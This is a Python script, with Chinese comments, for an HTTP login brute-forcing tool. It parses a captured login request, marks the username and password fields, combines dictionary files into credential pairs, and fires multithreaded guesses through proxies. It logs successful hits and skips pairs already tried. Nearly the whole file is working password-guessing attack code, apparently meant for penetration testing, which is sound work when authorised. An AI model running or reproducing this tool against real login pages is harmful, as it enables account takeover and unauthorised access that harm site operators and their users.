#!/usr/bin/env python
# encoding: utf-8
import argparse
import sys

from libs.lib_collect_opera.collect_operation import unfrozen_tuple_list, cartesian_product_merging, \
    de_duplicate_tuple_list, freeze_list_subtract
from libs.lib_file_operate.file_path import auto_create_file, file_is_empty
from libs.lib_file_operate.file_read import read_file_to_str, read_file_to_list
from libs.lib_http_pkg.http_pkg_mark import replace_payload_sign, search_and_mark_http_param, parse_http_params, \
    search_and_get_param_value
from libs.lib_http_pkg.parse_http_pkg import parse_http_pkg_by_email_simple
from libs.lib_log_print.logger_printer import set_logger, output, LOG_INFO, LOG_DEBUG, LOG_ERROR
from libs.lib_requests.check_protocol import check_protocol
from libs.lib_requests.requests_const import *
from libs.lib_requests.requests_thread import multi_thread_requests_url_body_headers_sign
from libs.lib_requests.requests_tools import get_random_str, analysis_dict_same_keys, access_result_handle
from libs.lib_tags_exec.tags_const import TAG_FUNC_DICT
from libs.lib_tags_exec.tags_exec import find_string_tag_error
from setting import *

sys.dont_write_bytecode = True  # 设置不生成pyc文件


# 组合请求任务列表
def generate_brute_task_list(pair_list, mark_url, mark_body, mark_headers, mark_username, mark_password,
                             const_sign_link):
    all_task_list = []
    for user_name, user_pass in pair_list:
        mark_repl_str_dict = {mark_username: user_name, mark_password: user_pass}
        new_url, new_body, new_headers = replace_payload_sign(req_url=mark_url,
                                                              req_body=mark_body,
                                                              req_headers=mark_headers,
                                                              mark_repl_str_dict=mark_repl_str_dict,
                                                              func_dict=TAG_FUNC_DICT)

        task = (new_url, new_body, new_headers, f"{user_name}{const_sign_link}{user_pass}")
        all_task_list.append(task)
    return all_task_list


def read_pairs_file_to_tuples(pairs_file, link_symbol, default_name_list=None, default_pass_list=None):
    pair_list = read_file_to_list(pairs_file, de_strip=True, de_weight=True, de_unprintable=True)

    # 拆分出账号 密码对 元祖
    pair_list = unfrozen_tuple_list(pair_list, link_symbol=link_symbol)

    # 如果输入了默认值列表,就组合更新的账号 列表
    if default_name_list or default_pass_list:
        output(f"[*] 已输入默认账号列表 {default_name_list} 需要更新账号密码列表")

        if default_name_list:
            pass_list = [name_pass_pair[1] for name_pass_pair in pair_list]
            pair_list = cartesian_product_merging(default_name_list, pass_list)

        if default_pass_list:
            name_list = [name_pass_pair[0] for name_pass_pair in pair_list]
            pair_list = cartesian_product_merging(name_list, default_pass_list)
        output(f"[*] 重组账号密码列表完成 name_pass_pair_list:{len(pair_list)}", level=LOG_INFO)

    return pair_list


def read_name_pass_to_tuples(name_file, pass_file, default_name_list=None, default_pass_list=None):
    # 读取账号文件
    if default_name_list:
        output(f"[*] 已输入默认账号列表 {default_name_list} 忽略读取账号字典文件", level=LOG_INFO)
        name_list = default_name_list
    else:
        name_list = read_file_to_list(name_file, de_strip=True, de_weight=True, de_unprintable=True)
        output(f"[*] 读取账号文件完成 name_list:{len(name_list)} <--> {name_list[:10]}", level=LOG_INFO)

    # 读取密码文件
    if default_pass_list:
        output(f"[*] 已输入默认密码列表 {default_pass_list} 忽略读取密码字典文件", level=LOG_INFO)
        pass_list = default_pass_list
    else:
        pass_list = read_file_to_list(pass_file, de_strip=True, de_weight=True, de_unprintable=True)
        output(f"[*] 读取密码文件完成 pass_list:{len(pass_list)} <--> {pass_list[:10]}", level=LOG_INFO)

    # 笛卡尔积组合账号密码字典
    name_pass_pair_list = []
    if len(name_list) and len(pass_list):
        name_pass_pair_list = cartesian_product_merging(name_list, pass_list)
    return name_pass_pair_list


# 登录爆破测试
def http_packet_login_auto_brute():
    # 检查请求报文是否存在
    if file_is_empty(GB_HTTP_FILE):
        output(f"[!] [{GB_HTTP_FILE}] is Empty, Please Fill Data to File!!!", level=LOG_ERROR)
        auto_create_file(GB_HTTP_FILE)
        return

    # 初始化HTTP报文
    http_pkg = read_file_to_str(GB_HTTP_FILE)

    # 解析HTTP报文开始
    output(f"[*] 解析HTTP报文...")
    parse_result = parse_http_pkg_by_email_simple(http_pkg)
    parse_host, parse_method, parse_path, parse_headers, parse_body, parse_content_type = parse_result

    output(f"[*] parse host:{parse_host}")
    output(f"[*] parse method:{parse_method}")
    output(f"[*] parse path:{parse_path}")
    output(f"[*] parse headers:{parse_headers}")
    output(f"[*] parse content_type:{parse_content_type}")
    output(f"[*] parse body:\n{'*' * 20}\n{parse_body}\n{'*' * 20}")

    # 标记请求body和请求path中的路径
    mark_body = parse_body
    mark_path = parse_path
    mark_headers = parse_headers

    default_name_list = []  # 默认账号列表
    default_pass_list = []  # 默认密码列表
    # 判断用户是否手动添加了用户名密码标记 如果存在就直接跳过查找 直接进行替换
    if GB_MARK_USERNAME in http_pkg and GB_MARK_PASSWORD in http_pkg:
        output(f"[+] 跳过请求报文参数标记操作...", level=LOG_INFO)
    elif GB_MARK_USERNAME in http_pkg and GB_MARK_PASSWORD not in http_pkg:
        # 设置用户名为默认值  建议
        default_pass_list.append("")
        output(f"[*] 当前未标记 {GB_MARK_PASSWORD} 忽略设置密码 默认值列表:[{default_pass_list}]", level=LOG_INFO)
    elif GB_MARK_PASSWORD in http_pkg and GB_MARK_USERNAME not in http_pkg:
        # 先分析有没有用户名参数,就提取用户名参数的值。 如果没有成功获取到用户名参数,将用户名参数设置为空值
        # 已标记密码参数,因此需要设置默认用户名的值
        output(f"[*] 开始请求报文参数标记操作...", level=LOG_INFO)
        # 解析请求中的参数列表。
        req_params = parse_http_params(req_path=parse_path,
                                       req_method=parse_method,
                                       req_body=parse_body,
                                       req_content_type=parse_content_type,
                                       )
        if req_params:
            default_username = search_and_get_param_value(req_params=req_params, search_key_list=GB_USERNAME_PARAMS)
            if default_username:
                default_name_list.append(default_username)
                output(f"[*] 当前未标记 {GB_MARK_USERNAME} 自动获取用户名 默认值列表:[{default_name_list}]", level=LOG_INFO)
            else:
                default_name_list.append("")
                output(f"[*] 当前未标记 {GB_MARK_USERNAME} 忽略设置用户名 默认值列表:[{default_name_list}]", level=LOG_INFO)
    else:
        output(f"[*] 开始请求报文参数标记操作...", level=LOG_INFO)
        # 解析请求中的参数列表。
        req_params = parse_http_params(req_path=parse_path,
                                       req_method=parse_method,
                                       req_body=parse_body,
                                       req_content_type=parse_content_type,
                                       )
        # 如果没有解析出参数列表
        if not req_params:
            output(f"[!] 参数解析错误,请检查报文解析代码或手动指定{GB_MARK_USERNAME}和{GB_MARK_PASSWORD}...", level=LOG_ERROR)
            return

        # 被替换的标记 : 报文中可能的账号密码关键字
        repl_mark_search_params_dict = {GB_MARK_USERNAME: GB_USERNAME_PARAMS, GB_MARK_PASSWORD: GB_PASSWORD_PARAMS}

        output(f"[*] 参数标记字典: {repl_mark_search_params_dict}", level=LOG_DEBUG)
        # 循环标记每个参数
        for mark_repl_string, search_key_list in repl_mark_search_params_dict.items():
            mark_status, mark_path, mark_body = search_and_mark_http_param(req_params=req_params,
                                                                           req_path=mark_path,
                                                                           req_body=mark_body,
                                                                           req_content_type=parse_content_type,
                                                                           search_key_list=search_key_list,
                                                                           mark_repl_string=mark_repl_string)

            if not mark_status:
                return

    output(f"[*] mark req path: {mark_path}", level=LOG_DEBUG)
    output(f"[*] mark req body: {mark_body}", level=LOG_DEBUG)
    output(f"[*] mark req headers: {mark_headers}", level=LOG_DEBUG)

    # 进行动态函数处理标签格式检查
    if GB_CHECK_TAGS:
        # 需要检查tag的部分
        check_tag_list = [str(mark_path), str(mark_body), str(mark_headers)]
        if find_string_tag_error(check_tag_list, TAG_FUNC_DICT):
            output("[!] 发现错误标签 继续(按键C)/退出(任意键):", level=LOG_ERROR)
            if input().strip().upper() != 'C':
                return

    # 动态判断判断请求协议
    if not GB_PROTOCOL:
        output(f"[*] 动态获取当前请求协议...")
        protocol = check_protocol(req_host=parse_host,
                                  req_method="GET",
                                  req_path=parse_path,
                                  req_headers=parse_headers,
                                  req_proxies=GB_PROXIES,
                                  req_timeout=GB_TIMEOUT,
                                  verify_ssl=GB_SSL_VERIFY)
        if protocol:
            output(f"[+] 获取请求协议成功: [{protocol}]", level=LOG_INFO)
        else:
            output(f"[-] 获取请求协议失败!!! 请(检查网络|检查代理|再次重试|手动配置)", level=LOG_ERROR)
            exit()

    # 组合URL
    req_url = f"{protocol}://{parse_host}{parse_path}"
    mark_url = f"{protocol}://{parse_host}{mark_path}"

    # 重新发送HTTP请求
    output(f"[*] 进行字典替换和多线程请求...", level=LOG_INFO)

    # 读取账号密码字典
    name_pass_pair_list = []
    if GB_NAME_PASS_FILE:
        # 使用【用户名字典】和【密码字典】
        pairs_list = read_name_pass_to_tuples(name_file=GB_NAME_FILE, pass_file=GB_PASS_FILE)
        name_pass_pair_list.extend(pairs_list)
    if GB_PAIR_FILE_FLAG:
        # 使用【用户名:密码对】字典
        pairs_list = read_pairs_file_to_tuples(pairs_file=GB_PAIR_FILE,
                                               link_symbol=GB_PAIR_LINK,
                                               default_name_list=default_name_list,
                                               default_pass_list=default_pass_list
                                               )
        name_pass_pair_list.extend(pairs_list)
    # 去重用户名密码对字典
    name_pass_pair_list = de_duplicate_tuple_list(name_pass_pair_list)

    # 存储已爆破的账号密码文件
    host_no_symbol = parse_host.replace(':', '_')
    path_no_symbol = parse_path.split('?', 1)[0].replace('/', '_')
    history_file = GB_LOG_FILE_DIR.joinpath(f"history_{host_no_symbol}.{path_no_symbol}.log")

    # 排除已经被爆破过得账号密码对
    history_list = read_file_to_list(history_file)
    history_tuple = unfrozen_tuple_list(history_list, GB_CONST_LINK)
    name_pass_pair_list = freeze_list_subtract(name_pass_pair_list, history_tuple, GB_CONST_LINK)

    if len(name_pass_pair_list):
        output(f"[*] 历史爆破记录过滤完毕, 剩余元素数量 {len(name_pass_pair_list)}", level=LOG_INFO)
    else:
        output(f"[*] 所有账号密码字典已过滤, 退出本次操作", level=LOG_INFO)
        return

    # 生成动态排除字典
    dynamic_exclude_dict = gen_dynamic_exclude_dict(mark_url=mark_url,
                                                    req_method=parse_method,
                                                    mark_body=mark_body,
                                                    mark_headers=mark_headers)

    # 生成爆破任务列表
    brute_task_list = generate_brute_task_list(pair_list=name_pass_pair_list,
                                               mark_url=mark_url,
                                               mark_body=mark_body,
                                               mark_headers=mark_headers,
                                               mark_username=GB_MARK_USERNAME,
                                               mark_password=GB_MARK_PASSWORD,
                                               const_sign_link=GB_CONST_LINK)

    # 将任务列表拆分为多个任务列表 再逐步进行爆破,便于统一处理结果
    task_size = GB_TASK_CHUNK_SIZE
    brute_task_list = [brute_task_list[i:i + task_size] for i in range(0, len(brute_task_list), task_size)]
    output(f"[*] 任务拆分 SIZE:[{task_size}] * NUM:[{len(brute_task_list)}]", level=LOG_INFO)

    # 统计总访问错误次数
    access_fail_count = 0
    # 根据主机名生成结果文件名
    result_file_path = GB_RESULT_DIR.joinpath(f"{host_no_symbol}.{path_no_symbol}.result.csv")
    # 直接被排除的请求记录
    ignore_file_path = GB_RESULT_DIR.joinpath(f"{host_no_symbol}.{path_no_symbol}.ignore.csv")

    # 循环多线程请求操作
    for sub_task_index, sub_task_list in enumerate(brute_task_list):
        output(f"[*] 任务进度 {sub_task_index + 1}/{len(brute_task_list)}", level=LOG_INFO)
        result_dict_list = multi_thread_requests_url_body_headers_sign(task_list=sub_task_list,
                                                                       threads_count=GB_THREADS_COUNT,
                                                                       thread_sleep=GB_THREAD_SLEEP,
                                                                       req_method=parse_method,
                                                                       req_proxies=GB_PROXIES,
                                                                       req_timeout=GB_TIMEOUT,
                                                                       verify_ssl=GB_SSL_VERIFY,
                                                                       req_allow_redirects=GB_ALLOW_REDIRECTS,
                                                                       req_stream=False,
                                                                       retry_times=GB_RETRY_TIMES,
                                                                       add_host_header=True,
                                                                       add_refer_header=True,
                                                                       ignore_encode_error=True
                                                                       )

        stop_run, hit_result_list = access_result_handle(result_dict_list=result_dict_list,
                                                         dynamic_exclude_dict=dynamic_exclude_dict,
                                                         ignore_file=ignore_file_path,
                                                         result_file=result_file_path,
                                                         history_file=history_file,
                                                         access_fail_count=access_fail_count,
                                                         exclude_status_list=GB_EXCLUDE_STATUS,
                                                         exclude_title_regexp=GB_EXCLUDE_REGEXP,
                                                         max_error_num=GB_MAX_ERROR_NUM,
                                                         hit_saving_field=HTTP_CONST_SIGN
                                                         )

        # 停止扫描任务
        if GB_ONLY_BRUTE_ONE_PASS and hit_result_list:
            output(f"[*] 发现可用账号密码 取消访问任务!!!", level=LOG_INFO)
            break
        elif stop_run:
            break
    output(f"[+] 测试完毕 {req_url}", level=LOG_INFO)


# 生成动态测试结果
def gen_dynamic_exclude_dict(mark_url, req_method, mark_body, mark_headers):
    # 组合测试任务
    test_name_pass_pair_list = [(get_random_str(12), get_random_str(12)),
                                (get_random_str(11), get_random_str(11)),
                                (get_random_str(10), get_random_str(10))]

    test_task_list = generate_brute_task_list(pair_list=test_name_pass_pair_list,
                                              mark_url=mark_url,
                                              mark_body=mark_body,
                                              mark_headers=mark_headers,
                                              mark_username=GB_MARK_USERNAME,
                                              mark_password=GB_MARK_PASSWORD,
                                              const_sign_link=GB_CONST_LINK)

    # 执行测试任务
    output(f"[+] 动态测试 分析动态结果排除字典", level=LOG_INFO)
    test_result_dict_list = multi_thread_requests_url_body_headers_sign(task_list=test_task_list,
                                                                        threads_count=GB_THREADS_COUNT,
                                                                        thread_sleep=GB_THREAD_SLEEP,
                                                                        req_method=req_method,
                                                                        req_proxies=GB_PROXIES,
                                                                        req_timeout=GB_TIMEOUT,
                                                                        verify_ssl=GB_SSL_VERIFY,
                                                                        req_allow_redirects=GB_ALLOW_REDIRECTS,
                                                                        req_stream=False,
                                                                        retry_times=GB_RETRY_TIMES,
                                                                        add_host_header=True,
                                                                        add_refer_header=True,
                                                                        ignore_encode_error=True
                                                                        )
    # 分析测试结果
    dynamic_exclude_dict = analysis_dict_same_keys(test_result_dict_list, HTTP_FILTER_VALUE_DICT,
                                                   HTTP_FILTER_IGNORE_KEYS)
    output(f"[+] 当前目标 {mark_url} 动态结果排除字典内容:[{dynamic_exclude_dict}]", level=LOG_INFO)
    return dynamic_exclude_dict


def parse_input():
    # RawDescriptionHelpFormatter 支持输出换行符
    argument_parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter, add_help=True)

    # description 程序描述信息
    argument_parser.description = "Login blasting based on http messages, support automatic analysis of account password parameters"

    argument_parser.add_argument("-f", "--http_file", default=GB_HTTP_FILE,
                                 help=f"Specifies HTTP Request Package, Default is [{GB_HTTP_FILE}]")

    argument_parser.add_argument("-P", "--protocol", default=GB_PROTOCOL,
                                 help=f"Specifies HTTP Request Protocol, Default is [{GB_PROTOCOL}]")

    argument_parser.add_argument("-pff", "--pair_file_flag", default=GB_PAIR_FILE_FLAG, action="store_true",
                                 help=f"控制使用账号密码对字典, Default is [{GB_PAIR_FILE_FLAG}]", )

    argument_parser.add_argument("-npf", "--name_pass_file", default=GB_NAME_PASS_FILE, action="store_false",
                                 help=f"控制使用账号、密码字典, Default is [{GB_NAME_PASS_FILE}]", )

    argument_parser.add_argument("-x", dest="proxies", default=GB_PROXIES,
                                 help=f"Specifies http|https|socks5 proxies, Default is [{GB_PROXIES}]")

    argument_parser.add_argument("-t", "--threads_count", default=GB_THREADS_COUNT, type=int,
                                 help=f"Specifies the request threads, Default is [{GB_THREADS_COUNT}]")

    argument_parser.add_argument("-d", "--debug_flag", default=GB_DEBUG_FLAG, action="store_true",
                                 help=f"Specifies Display Debug Info, Default is [{GB_DEBUG_FLAG}]", )

    # epilog 程序额外信息
    argument_parser.epilog = f"""Version: {GB_VERSION}\n\n更多参数可通过[setting.py]进行配置"""
    return argument_parser


def args_dict_handle(args):
    # 格式化输入的Proxy参数 如果输入了代理参数就会变为字符串
    if args.proxies and isinstance(args.proxies, str):
        if "socks" in args.proxies or "http" in args.proxies:
            args.proxies = {'http': args.proxies.replace('https://', 'http://'),
                            'https': args.proxies.replace('https://', 'http://')}
        else:
            output(f"[!] 输入的代理地址[{args.proxies}]不正确,正确格式:Proto://IP:PORT", level=LOG_ERROR)
    return args


if __name__ == '__main__':
    # 输入参数解析
    parser = parse_input()
    # 获取所有参数
    args = parser.parse_args()
    # 处理输入参数
    args = args_dict_handle(args)
    # 输出所有参数信息
    output(f"[*] 所有输入参数信息: {args}", level=LOG_INFO)
    time.sleep(0.1)

    # 使用字典解压将参数直接赋值给相应的全局变量
    for param_name, param_value in vars(args).items():
        globals_var_name = f"GB_{str(param_name).upper()}"
        try:
            globals()[globals_var_name] = param_value
            # output(f"[*] INPUT:{globals_var_name} -> {param_value}", level=SHOW_DEBUG)
        except Exception as error:
            output(f"[!] 输入参数信息: {param_name} {param_value} 未对应其全局变量!!!", level=LOG_ERROR)
            exit()

    # 根据用户输入的debug参数设置日志打印器属性 # 为主要是为了接受config.debug参数来配置输出颜色.
    set_logger(GB_INFO_LOG_FILE, GB_ERR_LOG_FILE, GB_DBG_LOG_FILE, GB_DEBUG_FLAG)

    # 进行登录爆破
    http_packet_login_auto_brute()
